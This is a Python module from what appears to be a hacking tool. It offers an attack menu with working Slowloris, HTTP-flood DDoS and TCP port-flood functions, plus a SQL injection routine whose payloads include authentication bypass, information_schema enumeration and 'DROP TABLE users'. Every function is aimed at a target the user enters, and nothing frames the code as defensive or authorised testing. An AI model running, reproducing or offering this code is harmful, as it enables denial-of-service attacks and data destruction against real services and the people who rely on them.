from main import colors, show_logo, log_action
import os
import time
import socket
import threading
import requests
import random

# --- Slowloris Attack ---
def slowloris(target):
    show_logo()
    print(f"\n{colors.RED}🐢 Starting Slowloris on {target}{colors.END}")
    host = target.split("//")[-1].split("/")[0]
    sockets = []
    
    def create_socket():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((host, 80))
            s.send(f"GET /?{random.randint(0,2000)} HTTP/1.1\r\n".encode())
            s.send(f"Host: {host}\r\n".encode())
            s.send("User-Agent: Mozilla/5.0\r\n".encode())
            s.send("Content-Length: 42\r\n".encode())
            return s
        except:
            return None
    
    # Build connections
    for _ in range(200):
        s = create_socket()
        if s:
            sockets.append(s)
    
    if not sockets:
        print(f"{colors.RED}✘ No connections possible!{colors.END}")
        return
    
    print(f"{colors.GREEN}✅ {len(sockets)} connections established{colors.END}")
    log_action(target, "SLOWLORIS", f"{len(sockets)} connections")
    
    try:
        while True:
            print(f"{colors.RED}⚡ Active connections: {len(sockets)}{colors.END}")
            for s in list(sockets):
                try:
                    s.send("X-a: b\r\n".encode())
                except:
                    sockets.remove(s)
            time.sleep(15)
    except KeyboardInterrupt:
        print(f"\n{colors.YELLOW}🛑 Attack stopped{colors.END}")
    finally:
        for s in sockets:
            s.close()

# --- SQL Injection ---
def sql_injection(target, scan_mode=False):
    show_logo()
    print(f"\n{colors.RED}💉 Starting SQL Injection on {target}{colors.END}")
    
    payloads = [
        "' OR '1'='1'--",
        "' UNION SELECT 1,table_name FROM information_schema.tables--",
        "'; DROP TABLE users--"
    ]
    
    vulnerable = False
    for payload in payloads:
        try:
            r = requests.get(f"{target}{payload}", timeout=5)
            if "error" in r.text.lower() or "syntax" in r.text.lower():
                print(f"{colors.YELLOW}⚠ Potential vulnerability with: {payload}{colors.END}")
                vulnerable = True
            elif r.status_code == 200:
                print(f"{colors.GREEN}✅ Successful execution with: {payload}{colors.END}")
                vulnerable = True
        except Exception as e:
            print(f"{colors.RED}✘ Error with {payload}: {str(e)}{colors.END}")
    
    if not vulnerable and not scan_mode:
        print(f"{colors.RED}✘ No SQLi vulnerabilities found{colors.END}")
    
    log_action(target, "SQL_INJECTION", f"Tested with {len(payloads)} payloads")
    if not scan_mode:
        input(f"\n{colors.YELLOW}↵ Press Enter...{colors.END}")

# --- DDoS Attack ---
def ddos(target):
    show_logo()
    print(f"\n{colors.RED}💣 Starting DDoS on {target}{colors.END}")
    stop_flag = False
    
    def attack():
        while not stop_flag:
            try:
                requests.get(target)
                print(f"{colors.RED}⚡ Packet sent{colors.END}", end='\r')
            except:
                pass
    
    threads = []
    for _ in range(100):
        t = threading.Thread(target=attack)
        t.daemon = True
        threads.append(t)
        t.start()
    
    log_action(target, "DDOS", "Started")
    print(f"{colors.GREEN}✅ Attack running (Press Enter to stop){colors.END}")
    input()
    stop_flag = True
    print(f"\n{colors.YELLOW}🛑 Attack stopped{colors.END}")

# --- Port Flood ---
def port_flood(target):
    show_logo()
    print(f"\n{colors.RED}🌊 Starting Port Flood on {target}{colors.END}")
    host = target.split("//")[-1].split("/")[0] if "//" in target else target
    port = int(input(f"{colors.WHITE}    ► Target port: {colors.END}"))
    stop_flag = False
    
    def flood():
        while not stop_flag:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((host, port))
                s.send(random.randbytes(1024))
                print(f"{colors.RED}⚡ Packet sent to port {port}{colors.END}", end='\r')
                s.close()
            except:
                pass
    
    threads = []
    for _ in range(50):
        t = threading.Thread(target=flood)
        t.daemon = True
        threads.append(t)
        t.start()
    
    log_action(target, "PORT_FLOOD", f"Port {port}")
    print(f"{colors.GREEN}✅ Attack running (Press Enter to stop){colors.END}")
    input()
    stop_flag = True
    print(f"\n{colors.YELLOW}🛑 Attack stopped{colors.END}")

# --- Attack Menu ---
def menu():
    while True:
        show_logo()
        print(f"{colors.RED}{colors.BOLD}    ⚔️ ATTACK MENU ⚔️{colors.END}")
        print(f"{colors.BOLD}    [1] Slowloris Attack")
        print("    [2] SQL Injection")
        print("    [3] DDoS Attack")
        print("    [4] Port Flood")
        print("    [0] Back")
        
        choice = input(f"\n{colors.WHITE}    ► Selection: {colors.END}")
        
        if choice == "0":
            return
        elif choice in ["1", "2", "3", "4"]:
            target = input(f"{colors.WHITE}    ► Target URL/IP: {colors.END}")
            if choice == "1":
                slowloris(target)
            elif choice == "2":
                sql_injection(target)
            elif choice == "3":
                ddos(target)
            elif choice == "4":
                port_flood(target)
